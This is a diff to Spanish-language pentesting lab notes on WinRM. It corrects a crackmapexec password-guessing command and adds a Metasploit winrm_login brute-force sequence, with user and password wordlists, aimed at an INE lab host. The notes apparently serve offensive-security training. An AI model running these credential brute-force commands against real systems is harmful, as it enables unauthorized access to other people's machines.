@@ -22,9 +22,20 @@ significa que WinRM está habilitado.
 Probar contraseñas contra WinRM con una lista de contraseñas.
 
 ```
-crackmapexec winrm <IP_OBJETIVO> -u administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+crackmapexec winrm <IP_OBJETIVO> -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 ```
+## Por msfconsole
 
+````
+msfconsole -q
+use auxiliary/scanner/winrm/winrm_login
+set RHOSTS demo.ine.local
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set PASSWORD anything
+exploit
+````
 Si encuentras una contraseña válida, puedes comprobarla directamente con un comando remoto.
 
 ---
